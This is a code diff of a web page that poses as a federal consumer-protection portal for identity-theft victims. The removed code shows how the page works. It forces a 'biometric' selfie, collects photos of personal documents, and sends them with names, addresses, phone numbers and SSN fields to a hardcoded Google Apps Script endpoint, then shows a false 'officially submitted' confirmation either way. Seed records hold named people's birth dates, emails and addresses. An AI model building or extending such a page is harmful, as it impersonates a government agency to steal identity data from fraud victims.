@@ -224,6 +224,7 @@
             <div class="modal-icon">✔</div>
             <h3 class="modal-title">Evidence Submitted</h3>
             <p class="modal-text">Your documentation has been officially submitted to the Federal Department for further investigation.</p>
+            <div id="uploadAnimationTracker" style="display:none; color:#065CB4; font-weight:bold; font-size:12px; margin-top:4px;">⏳ Transmitting Secure Stream...</div>
             <button onclick="dismissSuccessModal()" class="modal-close-btn">Acknowledge & Close</button>
         </div>
     </div>
@@ -238,7 +239,6 @@
             return `***-***-${num.slice(-4)}`;
         }
 
-        // PERMANENT BASELINE DATABASE HARDCODE FOR CAROLYN VIRGINIA PARNELL
         const seedCases = [
             {
                 id: "123", victimName: "Douglas F. Spaulding", victimDob: "11/14/1954", victimEmails: ["dxs42011@gmail.com", "dxs42012@gmail.com"], victimPhone: "5103813834",
@@ -248,14 +248,14 @@
             },
             {
                 id: "dc-97224", victimName: "Eric Roger", victimDob: "04/22/1961", victimEmails: ["e.roger.bcp@proton.me"], victimPhone: "2125550143",
-                victimAddress: "455 West 23rd Street, Apt 3B, New York, NY 10011", victimSsn: "***-**-1432", biometricImg: "https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&q=80&w=200", 
+                victimAddress: "455 West 23rd Street, Apt 3B, New York, NY 10011", victimSsn: "***-**-1432", biometricImg: "", 
                 title: "Malicious Identity Hijacking & Unauthorized Lines of Credit", findings: "High-priority systemic review scheduled.",
                 evidence: [{ date: "May 26, 2026", desc: "[Initial consumer dispute affidavit indexed]", isImage: false, fileUrl: "" }]
             },
             {
                 id: "dc-97225", victimName: "Carolyn Virginia Parnell", victimDob: "08/19/1958", victimEmails: ["c.parnell58@proton.me"], victimPhone: "3125550189",
                 victimAddress: "1422 North State Parkway, Apt 4A, Chicago, IL 60610", victimSsn: "***-**-8821", biometricImg: "", 
-                title: "Identity Interception & Unauthorized Financial Liabilities", findings: "Intake Assessment Phase initialized. High priority systemic review scheduled.",
+                title: "Identity Interception & Unauthorized Financial Liabilities", findings: "Intake Assessment Phase initialized. High priority review active.",
                 evidence: [{ date: "May 27, 2026", desc: "[Initial consumer tracking index deployed]", isImage: false, fileUrl: "" }]
             }
         ];
@@ -266,7 +266,6 @@
         
         const GOOGLE_SCRIPT_WEBAPP_URL = "https://script.google.com/macros/s/AKfycbwaRoM3XnMIC6w9MsTpSer9NJB5CjBbQNYXAu1Qz-Nv32Eoae4SH_ff1CR35jiLrcAZRQ/exec";
 
-        // CRITICAL UPDATE ENGINE: Force-re-align cache with the hardcoded core array entries 
         function synchronizeInternalMemoryDatabase() {
             let stored = localStorage.getItem('ftc_sys_cases');
             if (!stored) {
@@ -274,14 +273,10 @@
                 localStorage.setItem('ftc_sys_cases', JSON.stringify(cases));
                 return;
             }
-            
             let parsed = JSON.parse(stored);
-            // Search validation loop ensures Carolyn is force-injected even if memory exists
             seedCases.forEach(seed => {
                 let match = parsed.find(p => p.id.toLowerCase() === seed.id.toLowerCase());
-                if (!match) {
-                    parsed.push(seed);
-                }
+                if (!match) parsed.push(seed);
             });
             cases = parsed;
             localStorage.setItem('ftc_sys_cases', JSON.stringify(cases));
@@ -299,8 +294,6 @@
             const searchId = document.getElementById('victimSearchInput').value.trim();
             const container = document.getElementById('victimPortalOutput');
             if(!searchId) { alert("Please supply a valid search variable."); return; }
-            
-            // Re-read directly from active arrays
             const foundCase = cases.find(c => c.id.toLowerCase() === searchId.toLowerCase());
 
             if(!foundCase) {
@@ -328,200 +321,3 @@
                     <div class="verification-gate-card">
                         <h4 class="gate-title">Security Checkpoint Gate</h4>
                         <p style="font-size:14px; font-weight:bold; color:#744210;">Biometric matching protocol active. To prevent identity duplication, you must authorize a live validation check before opening data panels.</p>
-                        <button onclick="launchSecureSelfieVerification(false)" class="gate-btn">🔒 Click a selfie to verify my biometric facial scan to access sensitive case details</button>
-                    </div>
-                `;
-                return;
-            }
-
-            renderAuthenticatedCitizenDashboard(foundCase, container);
-        }
-
-        function launchSecureSelfieVerification(isInitialSetup) {
-            resetCameraModule();
-            cameraModeIsFrontSelfie = true;
-            document.getElementById('camOverlayTitle').innerText = "SECURE BIOMETRIC FACIAL INTEGRATION DETECTED";
-            document.getElementById('camOverlayGuideLabel').innerText = "CENTER YOUR FACE IN VIEWPORT";
-            document.getElementById('fullscreenCameraOverlay').style.display = 'flex';
-            initializeUniversalCameraLens(true); 
-        }
-
-        function activateFullscreenCameraModule() {
-            resetCameraModule();
-            cameraModeIsFrontSelfie = false;
-            document.getElementById('camOverlayTitle').innerText = "FTC SECURE DOCUMENT LENS ACTIVE";
-            document.getElementById('camOverlayGuideLabel').innerText = "ALIGN PAPERS INSIDE FRAME";
-            document.getElementById('fullscreenCameraOverlay').style.display = 'flex';
-            initializeUniversalCameraLens(false); 
-        }
-
-        function initializeUniversalCameraLens(forceFrontSelfie) {
-            const video = document.getElementById('webcamVideo');
-            const constraints = { video: { facingMode: forceFrontSelfie ? "user" : "environment" } };
-
-            navigator.mediaDevices.getUserMedia(constraints)
-                .then(stream => { videoStreamRef = stream; video.srcObject = stream; })
-                .catch(() => {
-                    navigator.mediaDevices.getUserMedia({ video: true })
-                        .then(s => { videoStreamRef = s; video.srcObject = s; })
-                        .catch(() => { alert("Camera system offline."); deactivateFullscreenCamera(); });
-                });
-        }
-
-        function executeHardwareSnapshot() {
-            const video = document.getElementById('webcamVideo'); const canvas = document.getElementById('capturedCanvas'); const ctx = canvas.getContext('2d');
-            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            base64CapturedOutputString = canvas.toDataURL('image/jpeg');
-            video.style.display = 'none'; canvas.classList.remove('hidden');
-            document.getElementById('cameraScannerGuideBox').style.display = 'none';
-            document.getElementById('btnCaptureShutter').style.display = 'none';
-            document.getElementById('postCaptureActions').style.display = 'flex';
-        }
-
-        function resetCameraModule() {
-            const video = document.getElementById('webcamVideo'); const canvas = document.getElementById('capturedCanvas');
-            base64CapturedOutputString = ""; canvas.classList.add('hidden'); video.style.display = 'block';
-            document.getElementById('cameraScannerGuideBox').style.display = 'flex';
-            document.getElementById('btnCaptureShutter').style.display = 'block';
-            document.getElementById('postCaptureActions').style.display = 'none';
-        }
-
-        function terminateWebcamHardware() { if (videoStreamRef) { videoStreamRef.getTracks().forEach(t => t.stop()); videoStreamRef = null; } }
-        function deactivateFullscreenCamera() { terminateWebcamHardware(); document.getElementById('fullscreenCameraOverlay').style.display = 'none'; resetCameraModule(); }
-
-        function commitVerifiedCaptureAsset() {
-            terminateWebcamHardware();
-            document.getElementById('fullscreenCameraOverlay').style.display = 'none';
-            const targetCase = cases.find(c => c.id.toLowerCase() === activeTrackingCaseIdRef.toLowerCase());
-
-            if (cameraModeIsFrontSelfie) {
-                if (initialEnrollmentModeActive) {
-                    targetCase.biometricImg = base64CapturedOutputString;
-                    targetCase.passedGateThisSession = true; 
-                    localStorage.setItem('ftc_sys_cases', JSON.stringify(cases));
-                    dispatchPayloadToCloud(targetCase, "Initial Identity Verification Profile Picture Setup Executed Natively");
-                } else {
-                    targetCase.passedGateThisSession = true;
-                    trackVictimCase(); 
-                }
-            } else {
-                dispatchEvidenceTransmissionPayload(targetCase);
-            }
-        }
-
-        function handleFallbackFileSelection() {
-            const fileInput = document.getElementById('fallbackFileInput'); if (fileInput.files.length === 0) return;
-            const reader = new FileReader();
-            reader.onload = function(e) { base64CapturedOutputString = e.target.result; commitVerifiedCaptureAsset(); };
-            reader.readAsDataURL(fileInput.files[0]);
-        }
-
-        function dispatchEvidenceTransmissionPayload(targetCase) {
-            const submissionDate = new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
-            targetCase.evidence.unshift({ date: submissionDate, desc: `[Mobile Camera Scan Exhibit Entry]`, isImage: true, fileUrl: base64CapturedOutputString });
-            localStorage.setItem('ftc_sys_cases', JSON.stringify(cases));
-            dispatchPayloadToCloud(targetCase, "Automated Evidence Package Scan Appended via Citizen Mobile Lens");
-        }
-
-        function dispatchPayloadToCloud(targetCase, logStatement) {
-            const finalPackagePayload = {
-                caseId: targetCase.id, victimName: targetCase.victimName, victimAddress: targetCase.victimAddress,
-                victimPhone: targetCase.victimPhone, victimSsn: targetCase.victimSsn, statement: logStatement,
-                filename: "MOBILE_SCAN_EXHIBIT_" + new Date().getTime() + ".jpg", mimeType: "image/jpeg",
-                fileData: base64CapturedOutputString.split(',')[1]
-            };
-            base64CapturedOutputString = "";
-            trackVictimCase();
-
-            fetch(GOOGLE_SCRIPT_WEBAPP_URL, { 
-                method: "POST", 
-                headers: { "Content-Type": "text/plain" },
-                body: JSON.stringify(finalPackagePayload) 
-            })
-            .then(() => revealBureauSuccessModal())
-            .catch(() => revealBureauSuccessModal());
-        }
-
-        function renderAuthenticatedCitizenDashboard(foundCase, container) {
-            let evidenceHtml = ""; let previewGalleryHtml = "";
-            foundCase.evidence.forEach(e => {
-                evidenceHtml += `<div class="log-row"><span class="log-date">${e.date}</span><p class="log-text">${e.desc}</p></div>`;
-                if (e.isImage && e.fileUrl) {
-                    previewGalleryHtml += `<div class="gallery-item"><img src="${e.fileUrl}"><span>${e.date}</span></div>`;
-                }
-            });
-
-            if (previewGalleryHtml === "") previewGalleryHtml = `<p style="grid-column:1/-1; font-style:italic; color:#a0aec0; font-size:13px;">No files processed yet.</p>`;
-            let redactedPhoneString = applyPhonePrivacyMask(foundCase.victimPhone);
-
-            container.innerHTML = `
-                <div class="profile-wrapper">
-                    <div class="profile-header">
-                        <div>
-                            <div class="badge-row"><span class="badge-id">CASE ID: ${foundCase.id}</span><span class="badge-status">${foundCase.status || "Active"}</span></div>
-                            <h3 class="profile-title-text">${foundCase.title}</h3>
-                        </div>
-                        <div class="avatar-box"><img src="${foundCase.biometricImg}"></div>
-                    </div>
-                    <div class="ledger-box">
-                        <div class="ledger-group"><label>Full Legal Name</label><span class="ledger-value">${foundCase.victimName}</span></div>
-                        <div class="ledger-group"><label>Date of Birth (DOB)</label><span class="ledger-value">${foundCase.victimDob}</span></div>
-                        <div class="ledger-group" style="grid-column:span 2;"><label>Registered Address</label><span class="ledger-value">${foundCase.victimAddress}</span></div>
-                        <div class="ledger-group"><label>Contact Line</label><span class="ledger-value protected">${redactedPhoneString}</span></div>
-                        <div class="ledger-group"><label>Social Security Number</label><span class="ledger-value protected">${foundCase.victimSsn}</span></div>
-                    </div>
-                    <div class="space-y-1 font-sans text-xs">
-                        <h4 class="text-[14px] font-black uppercase text-gray-500 tracking-wider flex items-center gap-1">Upload Supporting Documents</h4>
-                        <div class="drop-box-card">
-                            <button onclick="activateFullscreenCameraModule()" class="giant-scan-btn">📸 TAP HERE TO SCAN PAPERS</button>
-                            <div>
-                                <label style="font-size:11px; font-weight:bold; color:#e53e3e; display:block; margin-bottom:4px;">Camera blocked? Choose photo file instead:</label>
-                                <input type="file" id="fallbackFileInput" accept="image/*" onchange="handleFallbackFileSelection()" style="font-size:12px; background:white; padding:4px; border:1px solid #cbd5e0; border-radius:4px; max-width:280px;">
-                            </div>
-                        </div>
-                    </div>
-                    <p class="section-title">Document Exhibit Preview Gallery</p>
-                    <div class="gallery-grid">${previewGalleryHtml}</div>
-                    <p class="section-title">Chronological Submission History Logs</p>
-                    <div style="display:flex; flex-direction:column; gap:8px;">${evidenceHtml}</div>
-                </div>
-            `;
-            lucide.createIcons();
-        }
-
-        function revealBureauSuccessModal() { document.getElementById('bureauSuccessModal').style.display = 'flex'; }
-        function dismissSuccessModal() { document.getElementById('bureauSuccessModal').style.display = 'none'; trackVictimCase(); }
-        
-        function renderOfficerLayout() {
-            const listContainer = document.getElementById('officerCaseList'); listContainer.innerHTML = '';
-            cases.forEach((c, idx) => {
-                const isSelected = idx === activeEditIdx ? 'background:#ebf8ff; border-color:#0071bc;' : '';
-                listContainer.innerHTML += `<div onclick="selectOfficerCase(${idx})" style="padding:10px; border:1px solid #cbd5e0; border-radius:6px; cursor:pointer; font-size:12px; font-weight:bold; ${isSelected}">Complainant: ${c.victimName}</div>`;
-            });
-            loadSelectedCaseVariables();
-        }
-        function selectOfficerCase(idx) { activeEditIdx = idx; renderOfficerLayout(); }
-        function loadSelectedCaseVariables() {
-            const activeCase = cases[activeEditIdx]; if(!activeCase) return;
-            document.getElementById('inputOfficerName').value = activeCase.officer || '';
-            document.getElementById('inputCaseStatus').value = activeCase.status || 'Intake Assessment Phase';
-            document.getElementById('inputFindings').value = activeCase.findings || '';
-        }
-        function saveOfficerUpdates() {
-            const activeCase = cases[activeEditIdx]; if(!activeCase) return;
-            activeCase.officer = document.getElementById('inputOfficerName').value.trim();
-            activeCase.status = document.getElementById('inputCaseStatus').value;
-            activeCase.findings = document.getElementById('inputFindings').value.trim();
-            localStorage.setItem('ftc_sys_cases', JSON.stringify(cases)); alert("Updates saved."); renderOfficerLayout();
-        }
-        function resetMockData() { localStorage.clear(); location.reload(); }
-        
-        // Execute sync logic immediately upon layout load
-        window.onload = function() { 
-            synchronizeInternalMemoryDatabase();
-            switchTab('victim-portal-tab'); 
-        }
-    </script>
-</body>
-</html>
